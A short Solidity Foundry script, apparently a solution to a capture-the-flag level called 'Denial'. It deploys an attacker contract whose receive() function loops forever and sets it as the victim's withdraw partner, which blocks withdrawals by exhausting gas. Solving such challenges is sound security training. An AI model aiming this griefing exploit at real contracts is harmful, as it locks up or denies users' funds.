// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Denial.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    Denial public denial;

    constructor (address _address) {
        denial = Denial(payable(_address));
    }

    function attack() public {
        denial.withdraw();
    }

    receive() external payable {
        while (true) {}
    }
}

contract DenialAttack is Script {
    Denial public denial = Denial(payable(0xf6571df982D541374ca61653459Ca91F013BEdEF));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackerContract attackerContract = new AttackerContract(address(denial));

        denial.setWithdrawPartner(address(attackerContract));

        vm.stopBroadcast();
    }
}